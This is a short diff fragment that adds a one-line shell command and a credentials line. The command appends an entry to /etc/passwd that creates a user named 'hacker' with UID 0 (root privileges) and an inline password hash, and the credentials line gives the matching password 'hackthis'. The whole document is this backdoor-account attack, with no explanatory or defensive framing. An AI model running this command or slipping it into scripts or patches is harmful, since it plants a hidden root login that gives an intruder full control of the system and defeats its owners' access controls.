@@ -1,0 +1,3 @@
+echo "hacker:ga3kvpIsMfWBc:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+hacker:hackthis
